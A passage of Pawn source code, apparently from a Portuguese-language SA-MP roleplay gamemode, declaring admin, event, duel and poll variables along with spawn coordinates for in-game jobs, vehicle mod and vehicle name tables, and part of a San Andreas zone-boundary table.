	SpectateID[MAX_PLAYERS],
	SpectateType[MAX_PLAYERS],
	bool:Calado[MAX_PLAYERS],
	vehid
;

forward AtualizarChatBubble();
forward BanLog(string[]);

enum AdminInfo
{
	AdminL,
    Admin,
	Moderador,
	Ajudante,
	Corregedor,
	bool:Oculto
}
new aInfo[MAX_PLAYERS][AdminInfo];

new
	setoukit[MAX_PLAYERS]
;

new
	bool:aEventoCriado,
	bool:EventoApe,
	bool:EventoVei,
	bool:EventoDM
;

new
	Float:p1,
	Float:p2,
	Float:p3,
	Float:p4
;

new
	bool:ArenaDuelo[MAX_PLAYERS],
	TempoCounTD[MAX_PLAYERS],
	TimerDuelo[MAX_PLAYERS],
	DentroDuelo,
	IDX1,
	p1_,
	p2_
;

new Vendedor[MAX_PLAYERS], bool:CasaOferecida[MAX_PLAYERS], HouseIP, MoneyHouse[MAX_PLAYERS], RecebeuCasa[MAX_PLAYERS];

new bool:UseLoop[MAX_PLAYERS];

new PMBLOQUEADO[MAX_PLAYERS];
new NumeroCount;
new ChatStatus;
new ComandosStatus;
new Text:TextLoteria;

new Loop[MAX_PLAYERS] = 0;

new Text:Enquete, Text:ContagemEnquete, VotacaoIniciada, vSim, vNao, vTempo, Votou[MAX_PLAYERS];
new
	s5Doze[512], enquetep[512]
;
new ChatTuto[MAX_PLAYERS];
new bool:NoTuto[MAX_PLAYERS];

//-- Spawn prisão
new Float:SpawnPreso[][10] =
{
    {1562.0298,-1671.2778,5.8066},
    {1565.9313,-1671.7671,5.8066},
    {1569.8096,-1671.9797,5.8066},
    {1573.8180,-1672.3195,5.8066},
    {1577.6306,-1672.3116,5.8066},
    {1577.6334,-1672.2010,2.0466},
    {1573.4969,-1672.2004,2.0466},
    {1569.5760,-1672.4891,2.0466},
    {1565.8594,-1671.9883,2.0466},
    {1561.6692,-1671.9108,2.0466}
};

//-- Spawn das Profs
new Float:SpawnNovato[][4] =
{
	{1302.4674, -1378.9905, 13.7358, 270.3201},
	{1318.1194, -1378.9510, 13.8137, 84.5679}
};

/*new Float:SpawnPiloto[][4] =
{
	{5108.0747, -332.7360, 11.3027},
};*/

new Float:SpawnMotoBus[][4] =
{
	{2279.9578, -2310.9778, 13.5469, 210.9006},
	{2281.5708, -2364.8191, 13.5469, 314.8655}
};

new Float:SpawnTaxistas[][4] =
{
	{1269.0781, -1266.5751, 13.5697, 359.2587},
	{1286.4230, -1250.3250,13.5697, 176.9752}
};

new Float:SpawnCaminhoneiros[][4] =
{
	{2743.6677, -2453.8220, 13.8623, 273.4891},
	{2729.6687, -2451.4290, 17.5937, 265.7418}
};

new Float:SpawnTraficDorgas[][4] =
{
	{-1076.1073, -1156.9496, 129.2188, 269.4111},
	{-1025.8821, -1180.7336, 129.2188, 89.8695},
	{-1181.3829, -1143.4540, 129.2188, 1.1954}
};

new Float:SpawnTraficArmas[][4] =
{
	{-1109.5930, -1677.4019, 76.3739, 1.8666},
	{-1113.7642, -1639.1772, 76.3672, 273.5291}
};

new Float:SpawnChefeMafia[][4] =
{
	{-542.4813, 2593.6970, 53.5156, 267.5872},
	{-542.9972, 2569.6882, 53.5156, 266.6469},
	{-543.3828,2615.7595,53.5156,266.3338}
};

new Float:SpawnExerxito[][4] =
{
	{153.7647,1845.2401,17.6406,2.4933},
	{137.5357,1880.5796,17.8359,0.6133},
	{223.6900,1866.4016,13.1406,89.2640},
	{233.4717,1841.2284,17.6406,0.2532}
};

new Float:SpawnMedico[][4] =
{
	{1181.9735,-1332.1407,13.5842,267.1385},
	{-2705.0784,592.5579,14.4531,271.6229}
};

/*new Float:SpawnPetroleiro[][4] =
{
	{-1014.0436, -698.7059, 32.0078, 0.1993},
	{-1045.0081, -686.9926, 32.0126, 270.1268}
};*/
static ModName[][64] =
{ // by BigETI
	{"Pro Spoiler"},{"Win Spoiler"},{"Drag Spoiler"},{"Alpha Spoiler"},{"Champ Scoop Hood"},
	{"Fury Scoop Hood"},{"Roof Scoop"},{"Right Sideskirt"},{"5x Nitro"},{"2x Nitro"},{"10x Nitro"},
	{"Race Scoop Hood"},{"Worx Scoop Hood"},{"Round Fog Lamps"},{"Champ Spoiler"},{"Race Spoiler"},
	{"Worx Spoiler"},{"Left Sideskirt"},{"Upswept Exhaust"},{"Twin Exhaust"},{"Large Exhaust"},
	{"Medium Exhaust"},{"Small Exhaust"},{"Fury Spoiler"},{"Square Fog Lamps"},{"Offroad Wheels"},
	{"Right Alien Sideskirt 'Sultan'"},{"Left Alien Sideskirt 'Sultan'"},{"Alien Exhaust 'Sultan'"},
	{"X-Flow Exhaust 'Sultan'"},{"Left X-Flow Sideskirt 'Sultan'"},{"Right X-Flow Sideskirt 'Sultan'"},
	{"Alien Roof Vent 'Sultan'"},{"X-Flow Roof Vent 'Sultan'"},{"Alien Exhaust 'Elegy'"},{"X-Flow Roof Vent 'Elegy'"},
	{"Right Alien Sideskirt 'Elegy'"},{"X-Flow Exhaust 'Elegy'"},{"Alien Roof Vent 'Elegy'"},{"Right X-Flow Sideskirt 'Elegy'"},
	{"Left Alien Sideskirt 'Elegy'"},{"Right X-Flow Sideskirt 'Elegy'"},{"Right Chrome Sideskirt 'Broadway'"},
	{"Slamin Exhaust 'Broadway'"},{"Chrome Exhaust 'Broadway'"},{"X-Flow Exhaust 'Flash'"},{"Alien Exhaust 'Flash'"},
	{"Right Alien Sideskirt 'Flash'"},{"Right X-Flow Sideskirt 'Flash'"},{"Alien Spoiler 'Flash'"},{"X-Flow Spoiler 'Flash'"},
	{"Left Alien Sideskirt 'Flash'"},{"Left X-Flow Sideskirt 'Flash'"},{"X-Flow Roof 'Flash'"},{"Alien Roof 'Flash'"},
	{"Alien Roof 'Stratum'"},{"Right Alien Sideskirt 'Stratum'"},{"Right X-Flow Sideskirt 'Stratum'"},{"Alien Spoiler 'Stratum'"},
	{"X-Flow Exhaust 'Stratum'"},{"X-Flow Spoiler 'Stratum'"},{"X-Flow Roof 'Stratum'"},{"Left Alien Sideskirt 'Stratum'"},
	{"Left X-Flow Sideskirt 'Stratum'"},{"Alien Exhaust 'Stratum'"},{"Alien Exhaust 'Jester'"},{"X-Flow Exhaust 'Jester'"},
	{"Alien Roof 'Jester'"},{"X-Flow Roof 'Jester'"},{"Right Alien Sideskirt 'Jester'"},{"Right X-Flow Sideskirt 'Jester'"},
	{"Left Alien Sideskirt 'Jester'"},{"Left X-Flow Sideskirt 'Jester'"},{"Shadow Wheels"},{"Mega Wheels"},{"Rimshine Wheels"},
	{"Wires Wheels"},{"Classic Wheels"},{"Twist Wheels"},{"Cutter Wheels"},{"Switch Wheels"},{"Grove Wheels"},{"Import Wheels"},
	{"Dollar Wheels"},{"Trance Wheels"},{"Atomic Wheels"},{"Stereo Sound"},{"Hydraulics"},{"Alien Roof 'Uranus'"},{"X-Flow Exhaust 'Uranus'"},
	{"Right Alien Sideskirt 'Uranus'"},{"X-Flow Roof 'Uranus'"},{"Alien Exhaust 'Uranus'"},{"Right X-Flow Sideskirt 'Uranus'"},
	{"Left Alien Sideskirt 'Uranus'"},{"Right X-Flow Sideskirt 'Uranus'"},{"Ahab Wheels"},{"Virtual Wheels"},{"Access Wheels"},
	{"Left Chrome Sideskirt 'Broadway'"},{"Chrome Grill Bullbar 'Remington'"},{"Left 'Chrome Flames' Sideskirt 'Remington'"},
	{"Left 'Chrome Strip' Sideskirt 'Savanna'"},{"Corvetible Roof 'Blade'"},{"Chrome Exhaust 'Blade'"},{"Slamin Exhaust 'Blade'"},
	{"Right 'Chrome Arches' Sideskirt 'Remington'"},{"Left 'Chrome Strip' Sideskirt 'Blade'"},{"Right 'Chrome Strip' Sideskirt 'Blade'"},
	{"Chrome Rear Bullbars 'Slamvan'"},{"Slamin Rear Bullbars 'Slamvan'"},{"Little Front Sign? 'Slamvan'"},{"Little Front Sign? 'Slamvan'"},
	{"Chrome Exhaust 'Slamvan'"},{"Slamin Exhaust 'Slamvan'"},{"Chrome Front Bullbars 'Slamvan'"},{"Slamin Front Bullbars 'Slamvan'"},
	{"Chrome Front Bumper 'Slamvan'"},{"Right 'Chrome Trim' Sideskirt 'Slamvan'"},{"Right 'Wheelcovers' Sideskirt 'Slamvan'"},
	{"Left 'Chrome Trim' Sideskirt 'Slamvan'"},{"Left 'Wheelcovers' Sideskirt 'Slamvan'"},{"Right 'Chrome Flames' Sideskirt 'Remington'"},
	{"Bullbar Chrome Bars 'Remington'"},{"Left 'Chrome Arches' Sideskirt 'Remington'"},{"Bullbar Chrome Lights 'Remongton'"},
	{"Chrome Exhaust 'Remington'"},{"Slamin Exhaust 'Remington'"},{"Vinyl Hardtop 'Blade'"},{"Chrome Exhaust 'Savanna'"},
	{"Hardtop Roof 'Savanna'"},{"Softtop Roof 'Savanna'"},{"Slamin Exhaust 'Savanna'"},{"Right 'Chrome Strip' Sideskirt 'Savanna'"},
	{"Right 'Chrome Strip' Sideskirt 'Tornado'"},{"Slamin Exhaust 'Tornado'"},{"Chrome Exhaust 'Tornado'"},{"Left 'Chrome Strip' Sideskirt 'Tornado'"},
	{"Alien Spoiler 'Sultan'"},{"X-Flow Spoiler 'Sultan'"},{"X-Flow Rear Bumper 'Sultan'"},{"Alien Rear Bumper 'Sultan'"},
	{"Left Oval Vents"},{"Right Oval Vents"},{"Left Square Vents"},{"Right Square Vents"},{"X-Flow Spoiler 'Elegy'"},
	{"Alien Spoiler 'Elegy'"},{"X-Flow Rear Bumper 'Elegy'"},{"Alien Rear Bumper 'Elegy'"},{"Alien Rear Bumper 'Flash'"},
	{"X-Flow Rear Bumper 'Flash'"},{"X-Flow Front Bumper 'Flash'"},{"Alien Front Bumper 'Flash'"},{"Alien Rear Bumper 'Stratum'"},
	{"Alien Front Bumper 'Stratum'"},{"X-Flow Rear Bumper 'Stratum'"},{"X-Flow Front Bumper 'Stratum'"},{"X-Flow Spoiler 'Jester'"},
	{"Alien Rear Bumper 'Jester'"},{"Alien Front Bumper 'Jester'"},{"X-Flow Rear Bumper 'Jester'"},{"Alien Spoiler 'Jester'"},
	{"X-Flow Spoiler 'Uranus'"},{"Alien Spoiler 'Uranus'"},{"X-Flow Front Bumper 'Uranus'"},{"Alien Front Bumper 'Uranus'"},
	{"X-Flow Rear Bumper 'Uranus'"},{"Alien Rear Bumper 'Uranus'"},{"Alien Front Bumper 'Sultan'"},{"X-Flow Front Bumper 'Sultan'"},
	{"Alien Front Bumper 'Elegy'"},{"X-Flow Front Bumper 'Elegy'"},{"X-Flow Front Bumper 'Jester'"},{"Chrome Front Bumper 'Broadway'"},
	{"Slamin Front Bumper 'Broadway'"},{"Chrome Rear Bumper 'Broadway'"},{"Slamin Rear Bumper 'Broadway'"},{"Slamin Rear Bumper 'Remington'"},
	{"Chrome Front Bumper 'Remington'"},{"Chrome Rear Bumper 'Remington'"},{"Slamin Front Bumper 'Blade'"},{"Chrome Front Bumper 'Blade'"},
	{"Slamin Rear Bumper 'Blade'"},{"Chrome Rear Bumper 'Blade'"},{"Slamin Front Bumper 'Remington'"},{"Slamin Rear Bumper 'Savanna'"},
	{"Chrome Rear Bumper 'Savanna'"},{"Slamin Front Bumper 'Savanna'"},{"Chrome Front Bumper 'Savanna'"},{"Slamin Front Bumper 'Tornado'"},
	{"Chrome Front Bumper 'Tornado'"},{"Chrome Rear Bumper 'Tornado'"},{"Slamin Rear Bumper 'Tornado'"}
};

static vNome[212][] =
{
	{"Landstalker"},    {"Bravura"},            {"Buffalo"},            {"Linerunner"},     {"Perrenial"},      {"Sentinel"},       {"Dumper"},
	{"Firetruck"},      {"Trashmaster"},        {"Stretch"},            {"Manana"},         {"Infernus"},       {"Voodoo"},         {"Pony"},           {"Mule"},
	{"Cheetah"},        {"Ambulance"},          {"Leviathan"},          {"Moonbeam"},       {"Esperanto"},      {"Taxi"},           {"Washington"},
	{"Bobcat"},         {"Mr Whoopee"},         {"BF Injection"},       {"Hunter"},         {"Premier"},        {"Enforcer"},       {"Securicar"},
	{"Banshee"},        {"Predator"},           {"Bus"},{"Rhino"},      {"Barracks"},       {"Hotknife"},       {"Trailer 1"},      {"Previon"},
	{"Coach"},          {"Cabbie"},             {"Stallion"},           {"Rumpo"},          {"RC Bandit"},      {"Romero"},         {"Packer"},         {"Monster"},
	{"Admiral"},        {"Squalo"},             {"Seasparrow"},         {"Pizzaboy"},       {"Tram"},           {"Trailer 2"},      {"Turismo"},
	{"Speeder"},        {"Reefer"},             {"Tropic"},             {"Flatbed"},        {"Yankee"},         {"Caddy"},          {"Solair"},         {"Berkley's RC Van"},
	{"Skimmer"},        {"PCJ-6_0_0"},          {"Faggio"},             {"Freeway"},        {"RC Baron"},       {"RC Raider"},      {"Glendale"},       {"Oceanic"},
	{"Sanchez"},        {"Sparrow"},            {"Patriot"},            {"Quad"},           {"Coastguard"},     {"Dinghy"},         {"Hermes"},         {"Sabre"},
	{"Rustler"},        {"ZR-3_5_0"},           {"Walton"},             {"Regina"},         {"Comet"},{"BMX"},  {"Burrito"},        {"Camper"},         {"Marquis"},
	{"Baggage"},        {"Dozer"},              {"Maverick"},           {"News Chopper"},   {"Rancher"},        {"F.B.I. Rancher"},    {"Virgo"},          {"Greenwood"},
	{"Jetmax"},         {"Hotring"},            {"Sandking"},           {"Blista Compact"}, {"Police Maverick"},{"Boxville"},       {"Benson"},
	{"Mesa"},           {"RC Goblin"},          {"Hotring Racer A"},    {"Hotring Racer B"},{"Bloodring Banger"},{"Rancher"},
	{"Super GT"},       {"Elegant"},            {"Journey"},            {"Bike"},           {"Mountain Bike"},  {"Beagle"},         {"Cropdust"},       {"Stunt"},
	{"Tanker"},         {"Roadtrain"},          {"Nebula"},             {"Majestic"},       {"Buccaneer"},      {"Shamal"},         {"Hydra"},          {"FCR-900"},
	{"NRG-500"},        {"HPV1000"},            {"Cement Truck"},       {"Tow Truck"},      {"Fortune"},        {"Cadrona"},        {"F.B.I. Truck"},
	{"Willard"},        {"Forklift"},           {"Tractor"},            {"Combine"},        {"Feltzer"},        {"Remington"},      {"Slamvan"},
	{"Blade"},          {"Freight"},            {"Streak"},             {"Vortex"},         {"Vincent"},        {"Bullet"},         {"Clover"},         {"Sadler"},
	{"Firetruck LA"},   {"Hustler"},            {"Intruder"},           {"Primo"},          {"Cargobob"},       {"Tampa"},          {"Sunrise"},        {"Merit"},
	{"Utility"},        {"Nevada"},             {"Yosemite"},           {"Windsor"},        {"Monster A"},      {"Monster B"},      {"Uranus"},         {"Jester"},
	{"Sultan"},         {"Stratum"},            {"Elegy"},              {"Raindance"},      {"RC Tiger"},       {"Flash"},          {"Tahoma"},         {"Savanna"},
	{"Bandito"},        {"Freight Flat"},       {"Streak Carriage"},    {"Kart"},           {"Mower"},          {"Duneride"},       {"Sweeper"},
	{"Broadway"},       {"Tornado"},            {"AT-400"},             {"DFT-30"},         {"Huntley"},        {"Stafford"},       {"BF-400"},         {"Newsvan"},
	{"Tug"},            {"Trailer 3"},          {"Emperor"},            {"Wayfarer"},       {"Euros"},          {"Hotdog"},         {"Club"},           {"Freight Carriage"},
	{"Trailer 3"},      {"Andromada"},          {"Dodo"},               {"RC Cam"},         {"Launch"},         {"Viatura_LSPD"},{"Viatura_SFPD"},
	{"Viatura_LVPD"},   {"Police Ranger"},      {"Picador"},            {"F.B.I. Van"},      {"Alpha"},          {"Phoenix"},        {"Glendale"},
	{"Sadler"},         {"Luggage Trailer A"},  {"Luggage Trailer B"},  {"Stair Trailer"},{"Boxville"},         {"Farm Plow"},
	{"Utility Trailer"}
};

static const SanAndreasZones[][MainZone] =
{
	{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
	{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
	{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
	{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
	{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
	{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
	{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
	{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
	{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
	{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
	{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
	{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
	{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
	{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
	{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
	{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
	{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
	{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
	{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
	{"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
	{"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
	{"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
	{"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
	{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
	{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
	{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
	{"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
	{"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
	{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
	{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
	{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
	{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
	{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
	{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
	{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
	{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
	{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
	{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
	{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
	{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
	{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
	{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
	{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
	{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
	{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
	{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
	{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
	{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
	{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
	{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
	{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
	{"Downtown Los Santos",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
	{"Downtown Los Santos",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
	{"Downtown Los Santos",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
	{"Downtown Los Santos",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
	{"Downtown Los Santos",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
	{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
	{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
	{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
	{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
	{"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
	{"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
	{"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
	{"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
	{"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
	{"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
	{"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
	{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
	{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
	{"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
	{"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
	{"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
	{"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
	{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
	{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
	{"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
	{"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
	{"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
	{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
	{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
	{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
	{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
	{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
	{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
	{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
	{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
	{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
	{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
	{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
	{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
	{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
	{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
	{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
	{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
	{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
	{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
	{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
	{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
	{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
	{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
	{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
	{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
	{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
	{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
	{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
	{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
	{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
	{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
	{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
	{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
	{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
	{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
	{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
	{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
	{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
	{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
	{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
	{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
	{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
	{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
	{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
	{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
	{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
	{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
	{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
	{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
	{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
	{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
	{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
	{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
	{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
	{"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
	{"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
	{"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
	{"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
	{"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
	{"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
	{"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
	{"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
	{"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
	{"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
	{"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
	{"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
	{"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
	{"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
	{"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
	{"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
	{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
	{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
	{"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
